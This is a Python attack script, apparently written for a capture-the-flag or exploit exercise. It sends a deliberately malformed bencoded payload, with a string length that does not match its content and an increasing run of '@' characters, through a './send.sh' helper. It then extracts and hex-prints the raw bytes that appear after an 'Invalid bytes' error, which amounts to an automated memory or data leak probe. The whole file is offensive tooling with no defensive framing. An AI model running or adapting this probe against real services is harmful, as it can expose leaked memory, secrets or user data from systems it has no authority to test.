#!/usr/bin/env python3
import subprocess
import re

def run_command(at_count):
    # Create the payload with the specified number of '@' characters
    at_signs = '@' * at_count
    cmd = f"./send.sh 'd5:input5:AAAAA{at_signs}e'"
    
    # Run the command and capture its output as bytes, not text
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Combine stdout and stderr to catch the output
    output_bytes = result.stdout + result.stderr
    
    # Convert to string with errors='replace' to handle non-UTF-8 characters
    output = output_bytes.decode('utf-8', errors='replace')
    
    # Extract the part after "Invalid bytes"
    match = re.search(r"Invalid bytes.*?: (.*)", output)
    if match:
        # Get the matched text and process it
        matched_text = match.group(1)
        
        # Find the start position of the matched text in bytes
        start_pos = output.find(matched_text)
        if start_pos != -1:
            # Extract the raw bytes for the matched part
            raw_bytes = output_bytes[start_pos:start_pos+len(matched_text)]
            return raw_bytes
            
    return None

def main():
    # Start with specified number of '@' and increase
    at_count = 500
    max_attempts = 100  # Set a reasonable maximum to avoid infinite loops
    
    for i in range(max_attempts):
        result = run_command(at_count)
        if result:
            # Print raw bytes representation
            print(f"[{at_count} @s] Output: ", end="")
            
            # Print each byte in a readable format
            for b in result:
                if 32 <= b <= 126:  # Printable ASCII
                    print(chr(b), end="")
                else:
                    print(f"\\x{b:02x}", end="")
            print()
        else:
            print(f"[{at_count} @s] No 'Invalid bytes' found in output")
        
        at_count += 1  # Increase by one for the next iteration

if __name__ == "__main__":
    main()

